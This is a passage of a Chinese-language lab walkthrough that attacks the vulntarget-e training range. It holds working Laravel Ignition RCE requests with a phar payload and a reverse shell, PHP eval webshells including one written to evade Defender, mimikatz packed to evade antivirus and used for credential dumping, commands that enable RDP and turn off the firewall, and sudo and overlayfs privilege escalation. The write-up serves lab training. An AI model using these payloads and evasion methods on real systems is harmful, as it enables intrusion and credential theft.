class="number">00=69=00=59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=79=00=49</span>=<span class="number">00=37=00=66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=67</span>=<span class="number">00=36=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=63=00=47</span>=<span class="number">00=68=00=77</span>=<span class="number">00=49=00=48</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=30=00=67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=33=00=52</span>=<span class="number">00=74=00=63</span>=<span class="number">00=43=00=39</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=31</span>=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=41=00=76</span>=<span class="number">00=64=00=47</span>=<span class="number">00=31=00=77</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=32=00=59</span>=<span class="number">00=37=00=59</span>=<span class="number">00=32=00=46</span>=<span class="number">00=30=00=49</span>=<span class="number">00=43=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=77=00=76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=49=00=43</span>=<span class="number">00=31=00=70</span>=<span class="number">00=49=00=44</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=46=00=38</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=32</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=43=00=34</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=44=00=51</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=49</span>=<span class="number">00=34=00=49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=67=00=50</span>=<span class="number">00=69=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=69=00=63</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=42</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=63=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=54=00=73</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=68</span>=<span class="number">00=70=00=64</span>=<span class="number">00=44=00=73</span>=<span class="number">00=67=00=50</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=34=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=66</span>=<span class="number">00=51=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=52=00=34</span>=<span class="number">00=64=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=55</span>=<span class="number">00=33=00=59</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00=51=00=58</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=69=00=57</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=76</span>=<span class="number">00=55=00=64</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=41=00=44</span>=<span class="number">00=44=00=62</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=69=00=43</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=74=00=77</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=48</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=43</span>=<span class="number">00</span>a&quot;</span></span><br><span class="line"><span class="dns">  &#125;</span></span><br><span class="line"><span class="dns">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201330580.png" alt="image-20221129201330580"></p><p>发送如下数据包，清空对log文件中的干扰字符，只留下POC：返回200</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>299</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201505852.png" alt="image-20221129201505852"></p><p>使用phar://进行反序列化，执行任意代码（有的文章说相对路径，有的绝对路径，这里笔者觉得还是相对路径好用，绝对路径没出，如果想用绝对路径，上面500报错哪里有路径，我们这里使用相对吧）：这里要先nc监听一下<br><code>nc -lvnp 9999</code>shell就过来了，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>204</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201932533.png" alt="image-20221129201932533"></p><p>这里我们就拿到shell了，但是传文件可能不太好用，要反向下载，我们这里到web跟路径写个🐎后面方便传文件下载啥的。需要注意，这个执行就只能执行一次，上面已经说过了，日志文件会被覆盖，所以如果没打成功就要重新来一遍，而且第一次清空日志的时候一定要返回200才算清空成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/public</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[g]);?&gt;&#x27;</span> &gt; a.php</span><br><span class="line">cat a.php</span><br><span class="line">http://192.168.144.55/a.php</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129203359747.png" alt="image-20221129203359747"></p><p>信息收集一波，环境并没有装net-tools，没有ifconfig ，所以我们<code>ip a</code> 也可以查看ip，两块网卡，内网还有一个20的段</p><p><img src="/images/vulntarget-e/image-20221129203818846.png" alt="image-20221129203818846"></p><p>然后上个lse 或者linux-exploit-suggester-master 进行提权一下，当然不提也没关系，不影响后面。这里笔者把上面两个提权辅助工具都跑了一下，并没有发现什么好的提权方法，看了眼wp，说有弱口令。那肯定是看passwd文件，知道用户名<code>vulntarget</code>，然后爆破一下。</p><p><img src="/images/vulntarget-e/image-20221129211426271.png" alt="image-20221129211426271"></p><p>那这样的话，连上去就可以了。我们这里还是用蚁剑吧</p><p><img src="/images/vulntarget-e/image-20221129213522722.png" alt="image-20221129213522722"></p><p>./fscan_amd64 -h 10.0.20.141/24 -o a.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.141/24 -o a.txt</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">似乎并没有扫到内网，因为这台是win的机器，可能是防火墙的作用。我们加个np 禁ping扫</span><br><span class="line"></span><br><span class="line">./fscan_amd64 -h 10.0.20.141/24 -pn -o s.txt</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">10.0.20.100:80 open</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.100:443 open</span><br><span class="line">[*] WebTitle:https://10.0.20.100       code:403 len:301    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line">[*] WebTitle:http://10.0.20.100        code:200 len:42     title:Online Veterinary Appointment System - PHP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到还有一个100的机器，且开了80并且是一个winserver,挂代理访问</p><p>那么直接上代理，这里笔者上ew，把内网带出来。拖个ew上去，改一下777权限.当然其他代理软件也行，不唯一</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 8887</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129215012297.png" alt="image-20221129215012297"></p><p><img src="/images/vulntarget-e/image-20221129215310468.png" alt="image-20221129215310468"></p><p>用proxifier加个servers地址写外网地址，端口写代理端口</p><p>新加一个规则，我们写通往20的段，走代理</p><p><img src="/images/vulntarget-e/image-20221129215644648.png" alt="image-20221129215644648"></p><p><img src="/images/vulntarget-e/image-20221129215733868.png" alt="image-20221129215733868"></p><p>我们可以看到能成功访问20段ip了。</p><p>记一个坑：我在上完ew后启动了之后使用谷歌带的那个插件[SwitchyOmega] 也加了一个代理，然后去访问这个网站，前几次还行，三五条访问之后这个链路就挂了，</p><p>linux中ew报<code>Segmentation fault (core dumped)</code> 先开始我以为是ew版本不对或者蚁剑执行命令的问题，因为以前没有出现过这个情况，我又去shell里测了一下，发现，浏览器可能有插件可能会访问谷歌或者其他外网，然后就停掉了。我用了proxifier只加目标地址段没有出现任何问题。可能是访问外网的原因。没关系，解决了就好了</p><p><img src="/images/vulntarget-e/image-20221129221150992.png" alt="image-20221129221150992"></p><h3 id="OVAS-PHP-漏洞拿shell，免杀df"><a href="#OVAS-PHP-漏洞拿shell，免杀df" class="headerlink" title="OVAS - PHP 漏洞拿shell，免杀df"></a>OVAS - PHP 漏洞拿shell，免杀df</h3><p>开局给到一个cms，刚开始打的时候，我去google了一圈也找到利用的方法，甚至连提到这个cms的文章都很少，（除了其他佬写的wp），就去扫了目录看看有啥提示。然后回来再看看发现右上角有个adminlogin ，试着抓包看一下，我们看到username，password都是明文且没有验证码，存在爆破的条件，我们加载字典爆破一下。爆破成功admin，admin123</p><p><img src="/images/vulntarget-e/image-20221129221707205.png" alt="image-20221129221707205"></p><p><img src="/images/vulntarget-e/image-20221129221813516.png" alt="image-20221129221813516"></p><p>我们登录后台，那肯定是想办法拿shell了，看看有没有啥上传点，经过测试在settings中我们可以利用，settings中在welcome中添加一个图片，然后在随便选一个图片，点最下面update提交</p><p><img src="/images/vulntarget-e/image-20221130103146247.png" alt="image-20221130103146247"></p><p>然后在你插的那张图片中的base64编码中插入一句话，在最开始没看wp的时候，我就写了简单的phpinfo是没有问题的，我上传普通一句话木马，文件就报错，主页面显示include错误，以为是哪里打错了，网站崩了，后来发现并不是，我登上去win发现，win上开的有df，直接把我的🐎儿杀了，phpinfo不杀，不过也没关系，df对webshell查杀的能力比较差，网上随便找个简单免杀就能过。这里笔者提供一个。既然登上去了，笔者就把df更新到最新版了，这个🐎儿依然能用。下面都是基于做新版的df，time-22.11.28</p><p><img src="/images/vulntarget-e/image-20221130200829649.png" alt="image-20221130200829649"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bohemian</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/*bohemian*/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;g&#x27;</span>].<span class="string">&quot;/*bohemian**/&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">@<span class="keyword">eval</span>(bohemian());phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130104355866.png" alt="image-20221130104355866"></p><p>这里把包发过去就可以了，里面有个phpinfo 我们方便查看，去到主页看看</p><p><img src="/images/vulntarget-e/image-20221130103829535.png" alt="image-20221130103829535"></p><p><img src="/images/vulntarget-e/image-20221130110109643.png" alt="image-20221130110109643"></p><p>没有问题，蚁剑连一下。成功拿到shell</p><p><img src="/images/vulntarget-e/image-20221130110051787.png" alt="image-20221130110051787"></p><p>上来就能看到system权限，且有两块网卡，内部还有一个10的段</p><p><img src="/images/vulntarget-e/image-20221130110251974.png" alt="image-20221130110251974"></p><p>信息收集一波我们知道是开着df的先去桌面翻翻看，桌面上没有什么东西，但是这个目录C:/Users/Administrator/有个flag文件，内容<code>vulntarget&#123;VGhlIGhvc3QgcGFzc3dvcmQgbWF5IGJlIHVzZWQgZm9yIG90aGVyIHB1cnBvc2Vz&#125;  +_+</code>典型的base64  解一下，<code>The host password may be used for other purposes</code>笔者工地英语翻一下，大致的意思是这个电脑的密码会被用到其他地方。那么我们肯定去抓密码了。那就在这网站路径下穿个mimikatz，当然我们传上去肯定秒杀，df对mimikatz非常敏感的，这里我们呢去做一个简单免杀。</p><p>如果想深入研究mimikatz的免杀，参考这位佬的文章，Mimikatz的18种免杀姿势及防御策略<code>https://www.freebuf.com/news/234365.html</code></p><p>这里笔者提供一种非常简单的免杀操作，就是加壳，非常简单拿工具去生成一个就行。</p><p><code>当然这里免杀的操作其实都可以不做，为什么呢，因为上面其实我们已经是system权限了，我们其实把df关掉就行，但是这里是靶场，联系一下没有坏处</code></p><p>下面我们先对mimikatz免杀，打开VMProtect,选择mimikatz就行了，他就会编译了，然后会生成mimikatzvm.vmp.exe，把这个传上去就行了</p><p><img src="/images/vulntarget-e/image-20221130112521657.png" alt="image-20221130112521657"></p><p><img src="/images/vulntarget-e/image-20221130112528427.png" alt="image-20221130112528427"></p><p>这里没有交互式shell我们用mimikatz抓的话，直接导出结果就行</p><p><code>mimikatzvm.vmp.exe &quot;sekurlsa::logonpasswords&quot; exit &gt; s.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msv :</span><br><span class="line"> [00000005] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : WIN-JJJBQ4N87RA</span><br><span class="line"> * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line"> * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>dfc8d2bfa540a0a6e2248a82322e654e<br>ntlm<br>Admin#123</p><p>md5网站解一下就有了，</p><p>我们在上个fscan扫下下个网段，上个win的，这里上传上去直接报毒了，然后杀掉了</p><p><img src="/images/vulntarget-e/image-20221130201732733.png" alt="image-20221130201732733"></p><p>没关系，有个师傅二开了fscan的，<code>https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</code>我们去试一下，</p><p>这个文件有点大，20多m，蚁剑超时的话就上传失败了，我们改一下超时时间，改大点</p><p><img src="/images/vulntarget-e/image-20221130202142743.png" alt="image-20221130202142743"></p><p>笔者在这里上传成功了，但是不能用，笔者又传了一遍，这样的话三次了，全部叠加了一起并没有覆盖，我们从新改个名字传，或者删了又传了几遍，还是没成功，可能是代理的问题，文件有点大，作者说了，这里打包出来的fscan就是这么大没有压缩，可以自己压缩，upx压一下，或者上面那个工具，我们试下godzilla大文件上传</p><p><img src="/images/vulntarget-e/image-20221130202622434.png" alt="image-20221130202622434"></p><p><img src="/images/vulntarget-e/image-20221130202834288.png" alt="image-20221130202834288"></p><p>这里小tip，哥斯拉是可以连接一句话的。所以直接连就行</p><p><img src="/images/vulntarget-e/image-20221130204635575.png" alt="image-20221130204635575"></p><p>这里哥斯拉传上来没有问题，图没截</p><p><img src="/images/vulntarget-e/image-20221130205528351.png" alt="image-20221130205528351"></p><p>.\fscan_win_amd64.exe -h 10.0.10.0/24 -o r.txt</p><p><img src="/images/vulntarget-e/image-20221130205706916.png" alt="image-20221130205706916"></p><p>我们可以看到有个20的段 110的ip只开了22端口，显然是台linux了，估计又是弱口令，或者漏洞了。</p><p>正常思路是上ew，然后打后一个网端，但是这里不是这样的，我们要获取远程桌面，开下3389其实这样做在实战中是非常危险的，容易被发现。不过这里还是先要这样操作。</p><p>我们先cmd把3389开了<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p><img src="/images/vulntarget-e/image-20221130210751420.png" alt="image-20221130210751420"></p><p>打开之后直接登录就行了，administrator/Admin#123</p><p><img src="/images/vulntarget-e/image-20221130210947108.png" alt="image-20221130210947108"></p><p>哦对了，其实还是连不上，防火墙开着，我们再把防火墙关了</p><p><code>netsh advfirewall set allprofiles state off</code>\</p><p><img src="/images/vulntarget-e/image-20221130211126227.png" alt="image-20221130211126227"></p><p>就连上来了</p><p><img src="/images/vulntarget-e/image-20221130211216240.png" alt="image-20221130211216240"></p><p>下面有一个moba，我们打开是要密码的，然后输一下刚刚administrator的密码，上面flag说了,密码会用到其他地方，</p><p><img src="/images/vulntarget-e/image-20221130211247112.png" alt="image-20221130211247112"></p><h3 id="moba利用、cve-2021-3493"><a href="#moba利用、cve-2021-3493" class="headerlink" title="moba利用、cve_2021_3493"></a>moba利用、cve_2021_3493</h3><h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>直接就可以连上来，我们可以看到是一个vulntarget的普通用户，那肯定是想办法提权，上lse等等，这边笔者提供两个方法，一个是预期解和一个非预期解，非预期解是一个简单的提权方法，有很多机器如果你有了一个普通的可以登录的账户可以试试这个，屡试不爽。sudo漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">输入这个用户的密码</span><br><span class="line">！</span><br><span class="line">出去就是root了</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130211440233.png" alt="image-20221130211440233"></p><p>但是这里我们并不知道vulntarget的密码，因为上面进来的时候是输入的moba的安全密码，并不是ssh的密码，但是这里是可以看到的，依次点击settings-&gt;configuration-&gt;mobapasswords-&gt;show passs-&gt;这个pass就是moba的安全密码，</p><p><img src="/images/vulntarget-e/image-20221130212059351.png" alt="image-20221130212059351"></p><p><img src="/images/vulntarget-e/image-20221130212240621.png" alt="image-20221130212240621"></p><p>右面就会显示密码了，vuln@qwe好接下来sudo提权</p><p>sudo man man</p><p>vuln@qwe</p><p>!</p><p>回车</p><p><img src="/images/vulntarget-e/image-20221130212542320.png" alt="image-20221130212542320"></p><p><img src="/images/vulntarget-e/image-20221130212417710.png" alt="image-20221130212417710"></p><p><img src="/images/vulntarget-e/image-20221130212706685.png" alt="image-20221130212706685"></p><p>至此就拿下了最后一台靶机，root下有个flag，<code>find /* -name &quot;*flag*&quot;</code></p><p><img src="/images/vulntarget-e/image-20221130213029531.png" alt="image-20221130213029531"></p><p>瞅一眼，</p><p>root@ubuntu:~# cat /root/flag<br>Congratulations on winning the final flag</p><p>vulntarget{cve_2021_3493_local_privilege_promotion_overlayfs}</p><p>可以看到有一个2021_3493,是那个提权漏洞。</p><p>笔者这里跑了一下root密码，没出，emmmmm</p><p><img src="/images/vulntarget-e/image-20221130220156785.png" alt="image-20221130220156785"></p><h4 id="以上就是非预期解，下面是预期解"><a href="#以上就是非预期解，下面是预期解" class="headerlink" title="以上就是非预期解，下面是预期解"></a>以上就是非预期解，下面是预期解</h4><p><code>git clone https://github.com/briskets/CVE-2021-3493</code></p><p>cd进去</p><p>找一台ubuntu去克隆一下这个exp项目，这里注意若是在kali上编译，拿出来去目标机上执行会报错，找不到so文件。</p><p><code>gcc exploit.c -o exploit</code> </p><p>编译一下，拖出来到目标机上，这里拖到win上会报毒，我这里直接把df关掉吧，如果不想关了，就打个tar包，到目标机上在解压，rdp不能拖的话，可以复制粘贴，</p><p><img src="/images/vulntarget-e/image-20221130215219417.png" alt="image-20221130215219417"></p><p>这样也拿下了这台机器。至此整个靶场就打完了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>参考文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/crow821/vulntarget <span class="comment">#靶场官方地址</span></span><br><span class="line">https://mp.weixin.qq.com/s/cisoqDnsHqyzCFdx-eG5TQ <span class="comment">#作者的搭建与打靶记录</span></span><br><span class="line">https://www.freebuf.com/articles/web/333566.html <span class="comment">#vulntarget漏洞靶场系列（三）：vulntarget-c</span></span><br><span class="line">https://cloud.tencent.com/developer/article/1171183 <span class="comment">#九种姿势运行Mimikatz</span></span><br><span class="line">https://www.freebuf.com/news/234365.html <span class="comment">#Mimikatz的18种免杀姿势及防御策略</span></span><br><span class="line">https://www.freebuf.com/vuls/280508.html <span class="comment">#Laravel RCE（CVE-2021-3129）漏洞复现</span></span><br></pre></td></tr></table></figure><p>用到工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VMProtect Ultimate 3.4.0加壳软件</span><br><span class="line">https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg 提取码: emnq</span><br><span class="line">此百度网盘原链在`https://www.freebuf.com/news/234365.html`中</span><br><span class="line"></span><br><span class="line">二开fscan</span><br><span class="line">https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" 